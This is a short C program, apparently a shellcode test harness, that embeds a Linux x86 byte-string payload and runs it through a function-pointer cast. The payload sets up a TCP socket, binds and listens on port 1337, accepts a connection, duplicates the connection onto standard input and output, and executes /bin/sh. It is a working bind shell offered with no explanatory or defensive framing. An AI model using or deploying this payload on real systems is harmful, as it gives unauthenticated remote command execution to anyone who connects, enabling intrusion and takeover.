#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xc0\x31\xdb\xb3\x01\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x31\xc0\xfe\xc3\x50\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb0\x66\xcd\x80\x31\xc0\xfe\xc3\xfe\xc3\x50\x57\x89\xe1\xb0\x66\xcd\x80\x31\xc0\xfe\xc3\x50\x50\x57\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x31\xc9\xb1\x02\x89\xfb\x31\xc0\xb0\x3f\xcd\x80\x66\x49\x79\xf4\x31\xc0\x89\xc1\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

void main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}